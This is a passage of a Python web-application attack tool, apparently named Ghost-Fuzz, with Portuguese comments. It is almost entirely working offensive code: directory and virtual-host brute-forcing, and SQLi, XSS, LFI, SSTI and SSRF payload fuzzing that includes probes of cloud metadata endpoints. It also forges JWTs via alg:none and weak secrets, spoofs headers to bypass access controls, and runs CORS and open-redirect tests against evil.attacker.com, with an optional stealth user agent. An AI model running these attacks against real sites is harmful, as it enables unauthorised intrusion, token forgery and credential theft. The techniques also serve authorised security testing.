                if tamanho_404 and tamanho == tamanho_404 and status == 200:
                    continue  # Falso positivo

                encontrados.append(res)

    print()
    encontrados.sort(key=lambda x: x["status"])
    resultado["encontrados"] = encontrados

    if encontrados:
        _log(f"{len(encontrados)} resultado(s) encontrado(s):", "OK")
        for r in encontrados:
            cor = _cor_status(r["status"])
            redir = f" -> {r['redirect']}" if r["redirect"] else ""
            _log(
                f"  {cor}{r['status']}{C['X']}  {r['tamanho']:8}B  {r['url']}{redir}",
                "ACHADO" if r["status"] in [200, 301, 302] else "INFO",
            )
    else:
        _log("Nenhum resultado relevante encontrado", "INFO")

    # Recursao: explorar diretorios encontrados (max 2 niveis)
    if recurse and _depth < 2:
        dirs_para_recursar = [
            r for r in encontrados
            if r["status"] in [200, 301] and r["url"].endswith("/")
        ]
        for subdir in dirs_para_recursar:
            _log(f"Recursao [{_depth+1}]: {subdir['url']}", "INFO")
            sub_r = fuzzing_dir(
                subdir["url"], wordlist, extensoes=extensoes,
                threads=threads, timeout=timeout,
                filter_status=filter_status, filter_size=filter_size,
                stealth=stealth, proxy=proxy, verbose=verbose,
                recurse=True, _depth=_depth+1,
            )
            resultado["encontrados"].extend(sub_r.get("encontrados", []))

    return resultado


# ==============================================================================
# MODO: PARAMETER FUZZING
# ==============================================================================

def fuzzing_param(url_template, payload_tipo, callback_url=None, threads=20,
                  timeout=8, stealth=False, proxy=None, verbose=False):
    """Fuzz um parametro FUZZ com payloads de vulnerabilidade."""
    if "FUZZ" not in url_template:
        _log("URL deve conter 'FUZZ' como marcador do parametro", "ERRO")
        return {}

    resultado = {"url": url_template, "tipo": payload_tipo, "vulneraveis": []}
    sess = _criar_sessao(proxy, timeout)

    # Selecionar payloads
    payloads = PAYLOADS.get(payload_tipo, [])
    if callback_url and payload_tipo == "ssrf":
        payloads_ssrf_extra = [callback_url, f"http://{callback_url.split('://')[-1]}"]
        payloads = payloads_ssrf_extra + payloads

    _log(f"Testando {len(payloads)} payloads de {payload_tipo.upper()} em:", "INFO")
    _log(f"  {url_template}", "INFO")

    # Obter baseline
    baseline_status = None
    baseline_tamanho = None
    try:
        url_base = url_template.replace("FUZZ", "GHOST_BASELINE_12345")
        r = sess.get(url_base, timeout=timeout,
                     headers={"User-Agent": _get_ua(stealth)})
        baseline_status = r.status_code
        baseline_tamanho = len(r.content)
        if verbose:
            _log(f"Baseline: status={baseline_status} tamanho={baseline_tamanho}", "INFO")
    except Exception:
        pass

    indicadores = {
        "lfi": ["root:x:", "root:0:", "daemon:", "bin:/bin", "[boot loader]",
                "windows/system32", "www-data:", "nobody:"],
        "ssti": ["49", "7777777", "343", "calcresult"],
        "ssrf": ["169.254", "metadata", "ec2", "ami-", "iam", "computeMetadata",
                 "instance", "localhost", "127.0.0.1"],
        "xss": ["alert(1)", "alert(document", "onerror=", "onload="],
        "sqli": ["sql", "mysql", "syntax", "warning", "error", "ORA-", "pg_",
                 "microsoft", "unclosed quotation", "unterminated string"],
        "path_traversal": ["root:x:", "root:0:", "windows/system32", "boot loader"],
    }

    indicadores_tipo = indicadores.get(payload_tipo, [])
    concluido = 0

    def _testar_payload(payload):
        url = url_template.replace("FUZZ", urllib.parse.quote(payload, safe=""))
        try:
            r = sess.get(url, timeout=timeout,
                         headers={"User-Agent": _get_ua(stealth)},
                         allow_redirects=True)
            status = r.status_code
            corpo = r.text[:20000]
            tamanho = len(r.content)

            evidencias = []
            for indicador in indicadores_tipo:
                if indicador.lower() in corpo.lower():
                    evidencias.append(indicador)

            if status == 500:
                evidencias.append(f"HTTP 500 (possivel erro de aplicacao)")

            vuln = {
                "payload": payload,
                "url": url,
                "status": status,
                "tamanho": tamanho,
                "evidencias": evidencias,
            }
            return vuln, bool(evidencias)
        except Exception as e:
            return None, False

    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        futuros = {executor.submit(_testar_payload, p): p for p in payloads}
        for fut in concurrent.futures.as_completed(futuros):
            concluido += 1
            _progresso(concluido, len(payloads), f"{payload_tipo.upper()}:")
            vuln, encontrado = fut.result()
            if vuln and encontrado:
                resultado["vulneraveis"].append(vuln)

    print()

    if resultado["vulneraveis"]:
        _log(f"{len(resultado['vulneraveis'])} payload(s) potencialmente efetivo(s):", "CRITICO")
        for v in resultado["vulneraveis"]:
            _log(f"  [{v['status']}] {v['payload'][:80]}", "ACHADO")
            if v["evidencias"]:
                _log(f"    Evidencias: {', '.join(v['evidencias'][:3])}", "ALERTA")
    else:
        _log(f"Nenhum indicador de {payload_tipo.upper()} detectado automaticamente", "INFO")
        _log("Inspecione respostas manualmente ou use --verbose para detalhes", "INFO")

    return resultado


# ==============================================================================
# MODO: VHOST FUZZING
# ==============================================================================

def fuzzing_vhost(url, dominio_base, wordlist=None, threads=30, timeout=5,
                  stealth=False, proxy=None, verbose=False):
    """Brute-force de Virtual Hosts via Header Host."""
    if wordlist is None:
        wordlist = [
            "admin", "dev", "staging", "test", "internal", "intranet",
            "portal", "api", "vpn", "mail", "remote", "beta", "alpha",
            "secure", "login", "dashboard", "panel", "app", "cloud",
            "uat", "qa", "prod", "production", "management", "monitor",
            "jenkins", "gitlab", "jira", "confluence", "wiki", "docs",
        ]

    resultado = {"url": url, "dominio_base": dominio_base, "encontrados": []}
    sess = _criar_sessao(proxy, timeout)

    # Baseline com host invalido
    try:
        r_base = sess.get(url, headers={
            "User-Agent": _get_ua(stealth),
            "Host": f"GHOST_BASELINE_12345.{dominio_base}",
        }, allow_redirects=False, timeout=timeout)
        baseline_status = r_base.status_code
        baseline_tamanho = len(r_base.content)
    except Exception:
        baseline_status, baseline_tamanho = 404, 0

    _log(f"Baseline vhost: status={baseline_status}, tamanho={baseline_tamanho}", "INFO")

    def _testar_vhost(sub):
        host_valor = f"{sub}.{dominio_base}"
        try:
            r = sess.get(url, headers={
                "User-Agent": _get_ua(stealth),
                "Host": host_valor,
            }, allow_redirects=False, timeout=timeout)
            status = r.status_code
            tamanho = len(r.content)
            if status != baseline_status or abs(tamanho - baseline_tamanho) > 200:
                return {"vhost": host_valor, "status": status, "tamanho": tamanho}
        except Exception:
            pass
        return None

    concluido = 0
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        futuros = {executor.submit(_testar_vhost, s): s for s in wordlist}
        for fut in concurrent.futures.as_completed(futuros):
            concluido += 1
            _progresso(concluido, len(wordlist), "VHost:")
            r = fut.result()
            if r:
                resultado["encontrados"].append(r)

    print()
    if resultado["encontrados"]:
        _log(f"{len(resultado['encontrados'])} VHost(s) diferenciado(s):", "ACHADO")
        for v in resultado["encontrados"]:
            _log(f"  {v['vhost']:40} [{v['status']}] {v['tamanho']}B", "OK")
    else:
        _log("Nenhum VHost diferente detectado", "INFO")

    return resultado


# ==============================================================================
# SMART WORDLIST / RECON IMPORT
# ==============================================================================

def extrair_wordlist_site(url, sess, timeout=8, stealth=False):
    """Extrai palavras da pagina HTML/JS para usar como wordlist dinamica."""
    palavras = set()
    try:
        ua = _get_ua(stealth)
        r  = sess.get(url, headers={"User-Agent": ua}, timeout=timeout)
        content = r.text[:300000]
        # Extrair caminhos e palavras de tags/atributos
        padroes = [
            r'href=["\']([^"\'#?<>\s]{2,60})["\']',
            r'src=["\']([^"\'<>\s]{2,60})["\']',
            r'action=["\']([^"\'<>\s]{2,60})["\']',
            r'(?:name|id)=["\']([a-zA-Z0-9_\-]{2,30})["\']',
            r'/([a-zA-Z0-9_\-]{3,30})(?:[/?"]|$)',
        ]
        for p in padroes:
            for m in re.findall(p, content, re.IGNORECASE):
                segmentos = re.split(r'[/?=&#]', m)
                for seg in segmentos:
                    seg = seg.strip().strip(".")
                    if 2 <= len(seg) <= 30 and re.match(r'^[a-zA-Z0-9_\-]+$', seg):
                        palavras.add(seg.lower())
    except Exception:
        pass
    return sorted(palavras)


def importar_recon_json(arquivo):
    """Importa JSON do ghost-recon e retorna urls/subdomains/endpoints para fuzz."""
    alvos = []
    try:
        with open(arquivo, "r", encoding="utf-8") as f:
            data = json.load(f)
        url_base = data.get("url", "")
        if url_base:
            alvos.append(url_base)
        # Subdomains
        for sub in data.get("subdomains", {}).get("encontrados", []):
            sd = sub.get("subdomain", "")
            if sd:
                alvos.append(f"https://{sd}")
        # CT subdomains
        for sd in data.get("ct_logs", {}).get("subdomains_ct", []):
            alvos.append(f"https://{sd}")
        # JS endpoints
        for ep in data.get("js_endpoints", {}).get("endpoints", []):
            if ep.startswith("http"):
                alvos.append(ep)
        _log(f"Recon JSON importado: {len(alvos)} alvo(s) extraido(s)", "OK")
    except Exception as e:
        _log(f"Erro ao importar recon JSON: {e}", "ERRO")
    return alvos


# ==============================================================================
# MODULO: GRAPHQL INTROSPECTION
# ==============================================================================

_GQL_ENDPOINTS = [
    "/graphql", "/api/graphql", "/graphql/v1", "/api/v1/graphql",
    "/graphiql", "/playground", "/gql", "/query",
]

_GQL_INTROSPECT = '{"query":"{ __schema { types { name } } }"}'
_GQL_FULL       = ('{"query":"{ __schema { queryType { name } mutationType { name } '
                   'types { name kind fields { name args { name type { name } } } } } }"}')


def detectar_graphql(url, stealth=False, proxy=None, timeout=8, verbose=False):
    resultado = {"url": url, "endpoints": [], "schema": None}
    sess = _criar_sessao(proxy, timeout)
    ua   = _get_ua(stealth)
    base = url.rstrip("/")
    headers_gql = {
        "User-Agent": ua,
        "Content-Type": "application/json",
        "Accept": "application/json",
    }
    _log(f"Testando {len(_GQL_ENDPOINTS)} endpoints GraphQL...", "INFO")
    for ep in _GQL_ENDPOINTS:
        test_url = base + ep
        try:
            r = sess.post(test_url, data=_GQL_INTROSPECT.encode(),
                          headers=headers_gql, timeout=timeout)
            body = r.text[:4000]
            if r.status_code < 500 and ("__schema" in body or "__type" in body
                                         or '"data"' in body or "errors" in body):
                _log(f"GraphQL encontrado: {test_url} [{r.status_code}]", "ACHADO")
                resultado["endpoints"].append({"url": test_url, "status": r.status_code})
                # Tentar dump completo do schema
                try:
                    r2 = sess.post(test_url, data=_GQL_FULL.encode(),
                                   headers=headers_gql, timeout=timeout)
                    if "__schema" in r2.text:
                        _log("Schema GraphQL extraido com sucesso!", "CRITICO")
                        resultado["schema"] = r2.text[:50000]
                except Exception:
                    pass
        except Exception:
            pass
    if not resultado["endpoints"]:
        _log("Nenhum endpoint GraphQL detectado", "INFO")
    return resultado


# ==============================================================================
# MODULO: JWT TAMPER
# ==============================================================================

import base64 as _b64


def _jwt_decode_part(part):
    pad = 4 - len(part) % 4
    return _b64.b64decode(part + "=" * pad).decode("utf-8", errors="ignore")


def _jwt_encode_part(data_bytes):
    return _b64.urlsafe_b64encode(data_bytes).rstrip(b"=").decode()


def testar_jwt(token, url, param="token", stealth=False, proxy=None,
               timeout=8, verbose=False):
    resultado = {"token_original": token, "achados": []}
    sess = _criar_sessao(proxy, timeout)
    ua   = _get_ua(stealth)

    partes = token.split(".")
    if len(partes) != 3:
        _log("Token JWT invalido (deve ter 3 partes separadas por '.')", "ERRO")
        return resultado

    try:
        header_data = json.loads(_jwt_decode_part(partes[0]))
        payload_data= json.loads(_jwt_decode_part(partes[1]))
        _log(f"JWT Header: {header_data}", "INFO")
        _log(f"JWT Payload (resumo): {str(payload_data)[:120]}", "INFO")
    except Exception as e:
        _log(f"Erro ao decodificar JWT: {e}", "ERRO")
        return resultado

    def _testar(desc, token_mod):
        try:
            r = sess.get(url, params={param: token_mod},
                         headers={"User-Agent": ua}, timeout=timeout)
            status = r.status_code
            tamanho= len(r.content)
            _log(f"  {desc}: [{status}] {tamanho}B", "ALERTA" if status < 400 else "INFO")
            if status < 400:
                resultado["achados"].append({"tecnica": desc, "status": status,
                                             "token": token_mod[:80]})
        except Exception:
            pass

    # 1. alg:none
    h_none = dict(header_data)
    h_none["alg"] = "none"
    h_enc  = _jwt_encode_part(json.dumps(h_none, separators=(",", ":")).encode())
    p_enc  = partes[1]
    _testar("alg:none", f"{h_enc}.{p_enc}.")
    _testar("alg:None", f"{_jwt_encode_part(json.dumps({**header_data,'alg':'None'},separators=(',',':')).encode())}.{p_enc}.")
    _testar("alg:NONE", f"{_jwt_encode_part(json.dumps({**header_data,'alg':'NONE'},separators=(',',':')).encode())}.{p_enc}.")

    # 2. HS256 com secret em branco / comum
    import hmac, hashlib
    for secret in [b"", b"secret", b"password", b"jwt_secret", b"your-secret-key",
                   b"HS256", b"supersecret"]:
        try:
            h_hs  = dict(header_data); h_hs["alg"] = "HS256"
            h_b64 = _jwt_encode_part(json.dumps(h_hs, separators=(",", ":")).encode())
            p_b64 = partes[1]
            sig   = hmac.new(secret, f"{h_b64}.{p_b64}".encode(), hashlib.sha256).digest()
            sig_b64 = _jwt_encode_part(sig)
            _testar(f"weak secret '{secret.decode()}'", f"{h_b64}.{p_b64}.{sig_b64}")
        except Exception:
            pass

    # 3. kid injection (simples)
    if "kid" in header_data:
        h_kid = dict(header_data)
        h_kid["kid"] = "../../dev/null"
        h_enc2 = _jwt_encode_part(json.dumps(h_kid, separators=(",", ":")).encode())
        _testar("kid path traversal", f"{h_enc2}.{p_enc}.{partes[2]}")

    if resultado["achados"]:
        _log(f"JWT: {len(resultado['achados'])} tecnica(s) com resposta valida!", "CRITICO")
    else:
        _log("JWT: nenhum bypass bem-sucedido", "INFO")
    return resultado


# ==============================================================================
# MODULO: PARAMETER DISCOVERY (Param Miner)
# ==============================================================================

_PARAM_WORDLIST = [
    "id", "user", "username", "email", "name", "search", "q", "query",
    "page", "p", "limit", "offset", "sort", "order", "by", "type", "cat",
    "category", "tag", "filter", "key", "token", "auth", "session", "sid",
    "action", "cmd", "command", "exec", "run", "debug", "test", "dev",
    "admin", "role", "access", "file", "path", "url", "redirect", "return",
    "next", "callback", "ref", "source", "target", "dest", "format", "lang",
    "locale", "currency", "amount", "price", "code", "hash", "secret",
    "api_key", "apikey", "api", "version", "v", "rev", "date", "from",
    "to", "start", "end", "begin", "expire", "created", "updated",
    "status", "state", "mode", "method", "scope", "grant", "client_id",
    "include", "exclude", "fields", "expand", "embed", "depth", "level",
    "parent", "children", "group", "section", "module", "view", "template",
    "theme", "style", "color", "size", "width", "height", "output", "msg",
]


def fuzzing_param_discovery(url, wordlist=None, stealth=False, proxy=None,
                             timeout=8, threads=30, verbose=False):
    """Descobre parametros ocultos na URL (Param Miner)."""
    resultado = {"url": url, "encontrados": []}
    sess = _criar_sessao(proxy, timeout)
    ua   = _get_ua(stealth)
    wl   = wordlist or _PARAM_WORDLIST

    # Baseline: requisicao sem parametros extras
    try:
        r_base = sess.get(url, headers={"User-Agent": ua}, timeout=timeout)
        base_status  = r_base.status_code
        base_tamanho = len(r_base.content)
        base_hash    = hash(r_base.text[:2000])
    except Exception as e:
        _log(f"Erro ao obter baseline: {e}", "ERRO")
        return resultado

    _log(f"Baseline: [{base_status}] {base_tamanho}B | Testando {len(wl)} parametros...", "INFO")

    def _testar_param(param_name):
        achados = []
        sep    = "&" if "?" in url else "?"
        vals_teste = ["1", "true", "admin", "test", "debug", "../etc/passwd", "<x>"]
        for val in vals_teste[:3]:
            test_url = f"{url}{sep}{param_name}={val}"
            try:
                r = sess.get(test_url, headers={"User-Agent": ua}, timeout=timeout)
                status  = r.status_code
                tamanho = len(r.content)
                diff    = abs(tamanho - base_tamanho)
                # Detectar diferenca significativa de conteudo
                if (status != base_status
                        or (diff > 200 and diff > base_tamanho * 0.05)
                        or hash(r.text[:2000]) != base_hash):
                    achados.append({"param": param_name, "valor": val,
                                    "status": status, "tamanho": tamanho,
                                    "diff": diff})
            except Exception:
                pass
        return achados

    total = len(wl)
    concluido = 0
    encontrados = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as ex:
        futuros = {ex.submit(_testar_param, p): p for p in wl}
        for fut in concurrent.futures.as_completed(futuros):
            concluido += 1
            _progresso(concluido, total, "Params:")
            achados = fut.result()
            for a in achados:
                if a not in encontrados:
                    encontrados.append(a)

    print()
    deduped = {a["param"]: a for a in encontrados}
    resultado["encontrados"] = list(deduped.values())

    if resultado["encontrados"]:
        _log(f"{len(resultado['encontrados'])} parametro(s) com comportamento diferente:", "ACHADO")
        for a in resultado["encontrados"]:
            _log(f"  ?{a['param']}={a['valor']}  [{a['status']}] {a['tamanho']}B diff={a['diff']}B", "OK")
    else:
        _log("Nenhum parametro oculto detectado", "INFO")
    return resultado


# ==============================================================================
# MODULO: HEADER FUZZING
# ==============================================================================

_HEADERS_FUZZ = {
    "X-Forwarded-For":   ["127.0.0.1", "::1", "0.0.0.0", "localhost",
                          "192.168.1.1", "10.0.0.1"],
    "X-Originating-IP":  ["127.0.0.1", "::1", "0.0.0.0"],
    "X-Remote-IP":       ["127.0.0.1", "::1"],
    "X-Remote-Addr":     ["127.0.0.1", "::1"],
    "X-Client-IP":       ["127.0.0.1", "::1"],
    "X-Host":            ["localhost", "127.0.0.1"],
    "X-Rewrite-URL":     ["/admin", "/dashboard", "/login", "/.env", "/config"],
    "X-Custom-IP-Authorization": ["127.0.0.1", "::1"],
    "Referer":           ["https://localhost", "https://127.0.0.1/",
                          "https://admin.localhost/"],
    "User-Agent":        ["sqlmap/1.6", "() { :; };", "<script>alert(1)</script>",
                          "' OR 1=1--"],
    "Content-Type":      ["application/json", "text/xml", "application/xml",
                          "multipart/form-data"],
    "X-HTTP-Method-Override": ["PUT", "DELETE", "PATCH", "OPTIONS"],
    "X-Override-URL":    ["/admin", "/api/admin"],
}


def fuzzing_headers(url, headers_selecionados=None, stealth=False, proxy=None,
                    timeout=8, verbose=False):
    """Fuzzing de valores de headers HTTP para bypass e injecao."""
    resultado = {"url": url, "encontrados": []}
    sess = _criar_sessao(proxy, timeout)
    ua   = _get_ua(stealth)
    selecionados = headers_selecionados or list(_HEADERS_FUZZ.keys())

    try:
        r_base   = sess.get(url, headers={"User-Agent": ua}, timeout=timeout)
        base_st  = r_base.status_code
        base_sz  = len(r_base.content)
    except Exception as e:
        _log(f"Erro ao obter baseline: {e}", "ERRO")
        return resultado

    _log(f"Baseline: [{base_st}] {base_sz}B", "INFO")
    _log(f"Testando {len(selecionados)} header(s)...", "INFO")

    for header in selecionados:
        payloads = _HEADERS_FUZZ.get(header, [])
        for val in payloads:
            try:
                hdrs = {"User-Agent": ua, header: val}
                r    = sess.get(url, headers=hdrs, timeout=timeout)
                st   = r.status_code
                sz   = len(r.content)
                diff = abs(sz - base_sz)
                if st != base_st or diff > 100:
                    nivel = "CRITICO" if st in [200, 302] and base_st in [403, 401] else "ALERTA"
                    _log(f"{header}: {val!r:30} [{st}] {sz}B diff={diff}B", nivel)
                    resultado["encontrados"].append({
                        "header": header, "valor": val,
                        "status": st, "tamanho": sz, "diff": diff,
                    })
            except Exception:
                pass

    if not resultado["encontrados"]:
        _log("Nenhuma diferenca significativa em headers", "INFO")
    else:
        _log(f"{len(resultado['encontrados'])} variacao(oes) detectada(s)!", "ACHADO")
    return resultado


# ==============================================================================
# RELATORIO
# ==============================================================================

def gerar_relatorio(dados, arquivo):
    try:
        with open(arquivo, "w", encoding="utf-8") as f:
            json.dump(dados, f, indent=2, default=str, ensure_ascii=False)
        _log(f"Relatorio salvo: {arquivo}", "OK")
    except Exception as e:
        _log(f"Erro ao salvar: {e}", "ERRO")


# ==============================================================================
# VULN SCANNER
# ==============================================================================

def _detectar_sqli(url, timeout=5, proxy=None, stealth=False, verbose=False):
    proxies = {"http": proxy, "https": proxy} if proxy else None
    headers = {"User-Agent": _ua(stealth)}
    erros = ["sql syntax", "mysql_fetch", "ora-", "pg_query", "sqlite3", "unclosed quotation",
             "syntax error", "you have an error in your sql", "warning: mysql", "division by zero"]
    payloads_err = ["'", '"', "' OR '1'='1", "1' AND SLEEP(0)--", "1;SELECT 1--"]
    payloads_time = ["1' AND SLEEP(3)--", "1' WAITFOR DELAY '0:0:3'--", "1';SELECT pg_sleep(3)--"]
    achados = []
    base_url = url if "FUZZ" not in url else url.split("FUZZ")[0] + "1"
    try:
        for p in payloads_err:
            test_url = base_url + p if "?" not in base_url else base_url + p
            if "FUZZ" in url:
                test_url = url.replace("FUZZ", requests.utils.quote(p, safe=""))
            try:
                r = requests.get(test_url, headers=headers, proxies=proxies, timeout=timeout, verify=False, allow_redirects=False)
                for e in erros:
                    if e in r.text.lower():
                        achados.append({"tipo": "error-based", "payload": p, "indicador": e})
                        if verbose:
                            _log(f"SQLi error-based detectado: {p!r} -> {e!r}", "VULN")
                        break
            except Exception:
                pass
        for p in payloads_time:
            if "FUZZ" in url:
                test_url = url.replace("FUZZ", requests.utils.quote(p, safe=""))
            else:
                test_url = base_url + p
            try:
                t0 = time.time()
                requests.get(test_url, headers=headers, proxies=proxies, timeout=timeout + 4, verify=False, allow_redirects=False)
                elapsed = time.time() - t0
                if elapsed >= 2.8:
                    achados.append({"tipo": "time-based", "payload": p, "delay_s": round(elapsed, 2)})
                    if verbose:
                        _log(f"SQLi time-based: delay {elapsed:.1f}s com {p!r}", "VULN")
            except Exception:
                pass
    except Exception:
        pass
    return achados


def _detectar_xss(url, timeout=5, proxy=None, stealth=False, verbose=False):
    proxies = {"http": proxy, "https": proxy} if proxy else None
    headers = {"User-Agent": _ua(stealth)}
    token = "GHXSS" + str(int(time.time()))[-4:]
    payloads = [
        f"<script>alert('{token}')</script>",
        f"'\"><img src=x onerror=alert('{token}')>",
        f"<svg onload=alert('{token}')>",
    ]
    achados = []
    for p in payloads:
        if "FUZZ" in url:
            test_url = url.replace("FUZZ", requests.utils.quote(p, safe=""))
        else:
            test_url = url + requests.utils.quote(p, safe="")
        try:
            r = requests.get(test_url, headers=headers, proxies=proxies, timeout=timeout, verify=False)
            if token in r.text or p in r.text:
                achados.append({"tipo": "reflected-xss", "payload": p})
                if verbose:
                    _log(f"XSS refletido detectado: {p!r}", "VULN")
                break
        except Exception:
            pass
    return achados


def _detectar_lfi(url, timeout=5, proxy=None, stealth=False, verbose=False):
    proxies = {"http": proxy, "https": proxy} if proxy else None
    headers = {"User-Agent": _ua(stealth)}
    payloads = [
        "../../../../etc/passwd", "../../../etc/passwd", "..%2F..%2F..%2Fetc%2Fpasswd",
        "....//....//etc/passwd", "/etc/passwd", "C:\\windows\\system32\\drivers\\etc\\hosts",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    ]
    indicadores = ["root:x:", "daemon:", "[fonts]", "for 16-bit", "[extensions]"]
    achados = []
    for p in payloads:
        if "FUZZ" in url:
            test_url = url.replace("FUZZ", p)
        else:
            sep = "&" if "?" in url else "?"
            test_url = url + sep + "file=" + requests.utils.quote(p, safe="")
        try:
            r = requests.get(test_url, headers=headers, proxies=proxies, timeout=timeout, verify=False)
            for ind in indicadores:
                if ind in r.text:
                    achados.append({"tipo": "lfi", "payload": p, "indicador": ind})
                    if verbose:
                        _log(f"LFI detectado: {p!r} -> {ind!r}", "VULN")
                    break
        except Exception:
            pass
    return achados


def _detectar_ssrf(url, timeout=6, proxy=None, stealth=False, verbose=False):
    proxies = {"http": proxy, "https": proxy} if proxy else None
    headers = {"User-Agent": _ua(stealth)}
    imds_endpoints = [
        ("AWS", "http://169.254.169.254/latest/meta-data/"),
        ("Azure", "http://169.254.169.254/metadata/instance?api-version=2021-02-01"),
        ("GCP", "http://metadata.google.internal/computeMetadata/v1/"),
    ]
    indicadores_aws = ["ami-id", "instance-id", "iam"]
    indicadores_az = ["compute", "network", "subscriptionId"]
    indicadores_gcp = ["instance", "project", "attributes"]
    achados = []
    for cloud, endpoint in imds_endpoints:
        if "FUZZ" in url:
            test_url = url.replace("FUZZ", requests.utils.quote(endpoint, safe=""))
        else:
            sep = "&" if "?" in url else "?"
            test_url = url + sep + "url=" + requests.utils.quote(endpoint, safe="")
        try:
            r = requests.get(test_url, headers=headers, proxies=proxies, timeout=timeout, verify=False)
            inds = indicadores_aws if cloud == "AWS" else (indicadores_az if cloud == "Azure" else indicadores_gcp)
            for ind in inds:
                if ind in r.text.lower():
                    achados.append({"tipo": "ssrf-imds", "cloud": cloud, "endpoint": endpoint})
                    if verbose:
                        _log(f"SSRF/IMDS {cloud}: {endpoint}", "VULN")
                    break
        except Exception:
            pass
    return achados


def _verificar_cors(url, timeout=5, proxy=None, stealth=False, verbose=False):
    proxies = {"http": proxy, "https": proxy} if proxy else None
    evil_origin = "https://evil.attacker.com"
    headers = {"User-Agent": _ua(stealth), "Origin": evil_origin}
    achados = []
    try:
        r = requests.get(url, headers=headers, proxies=proxies, timeout=timeout, verify=False)
        acao = r.headers.get("Access-Control-Allow-Origin", "")
        credenciais = r.headers.get("Access-Control-Allow-Credentials", "")
        if evil_origin in acao or acao == "*":
            if credenciais.lower() == "true":
                achados.append({"tipo": "cors-wildcard-credentials", "acao": acao})
                if verbose:
                    _log(f"CORS critico: Allow-Credentials + origin evil", "VULN")
            else:
                achados.append({"tipo": "cors-wildcard", "acao": acao})
                if verbose:
                    _log(f"CORS wildcard: {acao}", "VULN")
    except Exception:
        pass
    return achados


def _detectar_redirect(url, timeout=5, proxy=None, stealth=False, verbose=False):
    proxies = {"http": proxy, "https": proxy} if proxy else None
    headers = {"User-Agent": _ua(stealth)}
    payloads = [
        "https://evil.attacker.com", "//evil.attacker.com", "/\\evil.attacker.com",
        "https:///evil.attacker.com", "http://evil.attacker.com@trusted.com",
    ]
    achados = []
    for p in payloads:
        if "FUZZ" in url:
            test_url = url.replace("FUZZ", requests.utils.quote(p, safe=""))
        else:
            sep = "&" if "?" in url else "?"
            test_url = url + sep + "redirect=" + requests.utils.quote(p, safe="")
        try:
            r = requests.get(test_url, headers=headers, proxies=proxies, timeout=timeout,
                             verify=False, allow_redirects=False)
            loc = r.headers.get("Location", "")
            if "evil.attacker.com" in loc or (loc and (loc.startswith("http://evil") or loc.startswith("//evil"))):
                achados.append({"tipo": "open-redirect", "payload": p, "location": loc})
                if verbose:
                    _log(f"Open Redirect: {p!r} -> {loc!r}", "VULN")
                break
        except Exception:
            pass
    return achados


def fuzzing_vuln(url, checks, timeout=5, proxy=None, stealth=False, verbose=False):
    resultado = {"url": url, "achados": {}}
    mapa = {
        "sqli": _detectar_sqli, "xss": _detectar_xss, "lfi": _detectar_lfi,
        "ssrf": _detectar_ssrf, "cors": _verificar_cors, "redirect": _detectar_redirect,
    }
    for check in checks:
        fn = mapa.get(check)
        if fn:
            _log(f"Testando {check.upper()} em {url}", "INFO")
            r = fn(url, timeout=timeout, proxy=proxy, stealth=stealth, verbose=verbose)
            resultado["achados"][check] = r
            if r:
                print(f"  {C['R']}{C['N']}[VULN]{C['X']} {check.upper()}: {len(r)} achado(s)")
            else:
                print(f"  {C['G']}[OK]{C['X']} {check.upper()}: nenhuma vulnerabilidade encontrada")
    return resultado


# ==============================================================================
# CLI
# ==============================================================================

def main():
    parser = argparse.ArgumentParser(
        prog="ghost-fuzz",
        description="Ghost-Fuzz v{} - Web Application Fuzzer | By Gh0st-Bx1".format(VERSAO),
        formatter_class=argparse.RawTextHelpFormatter,
    )

    sub = parser.add_subparsers(dest="modo", help="Modo de fuzzing")

    # Modo DIR
    p_dir = sub.add_parser("dir", help="Brute-force de diretorios e arquivos")
    p_dir.add_argument("-u", "--url", required=True, help="URL alvo (ex: https://exemplo.com)")
    p_dir.add_argument("-w", "--wordlist", help="Arquivo de wordlist")
    p_dir.add_argument("--builtin", choices=list(WORDLISTS.keys()),
                       help=f"Wordlist embutida: {', '.join(WORDLISTS.keys())}")
    p_dir.add_argument("--ext", help="Extensoes (ex: php,txt,bak,old)")
    p_dir.add_argument("--recurse", action="store_true", help="Fuzzing recursivo")
    p_dir.add_argument("--filter-status", help="Mostrar apenas estes status (ex: 200,301,302)")
    p_dir.add_argument("--filter-size", type=int, help="Ignorar respostas com este tamanho")

    # Modo PARAM
    p_param = sub.add_parser("param", help="Fuzzing de parametro (LFI/SSTI/SSRF/XSS/SQLi)")
    p_param.add_argument("-u", "--url", required=True,
                         help="URL com FUZZ como marcador (ex: https://site.com/page?id=FUZZ)")
    p_param.add_argument("--lfi", action="store_true", help="Payloads LFI/RFI")
    p_param.add_argument("--ssti", action="store_true", help="Payloads SSTI")
    p_param.add_argument("--ssrf", action="store_true", help="Payloads SSRF")
    p_param.add_argument("--xss", action="store_true", help="Payloads XSS")
    p_param.add_argument("--sqli", action="store_true", help="Payloads SQL Injection")
    p_param.add_argument("--traversal", action="store_true", help="Payloads Path Traversal")
    p_param.add_argument("--callback", help="URL de callback para SSRF OOB")
    p_param.add_argument("--todos", action="store_true", help="Todos os tipos de payload")

    # Modo VHOST
    p_vhost = sub.add_parser("vhost", help="Brute-force de Virtual Hosts")
    p_vhost.add_argument("-u", "--url", required=True, help="URL alvo")
    p_vhost.add_argument("-d", "--dominio", required=True, help="Dominio base (ex: empresa.com)")
    p_vhost.add_argument("-w", "--wordlist", help="Wordlist de subdomains")

    # Modo PARAMS (Param Miner)
    p_params = sub.add_parser("params", help="Descoberta de parametros ocultos (Param Miner)")
    p_params.add_argument("-u", "--url", required=True, help="URL alvo")
    p_params.add_argument("-w", "--wordlist", help="Arquivo de wordlist de parametros")
    p_params.add_argument("--from-recon", dest="from_recon", metavar="FILE",
                          help="Importar alvos de JSON do ghost-recon")

    # Modo HEADERS (Header Fuzzing)
    p_hdrs = sub.add_parser("headers", help="Fuzzing de valores de headers HTTP")
    p_hdrs.add_argument("-u", "--url", required=True, help="URL alvo")
    p_hdrs.add_argument("--header", action="append", dest="headers_selecionados",
                        metavar="NOME",
                        help="Header especifico a testar (pode repetir). Padrao: todos")

    # Modo GRAPHQL
    p_gql = sub.add_parser("graphql", help="Deteccao e introspeccao de GraphQL")
    p_gql.add_argument("-u", "--url", required=True, help="URL base alvo")

    # Modo JWT
    p_jwt = sub.add_parser("jwt", help="Manipulacao e bypass de tokens JWT")
    p_jwt.add_argument("-u", "--url", required=True, help="URL alvo para testar o token")
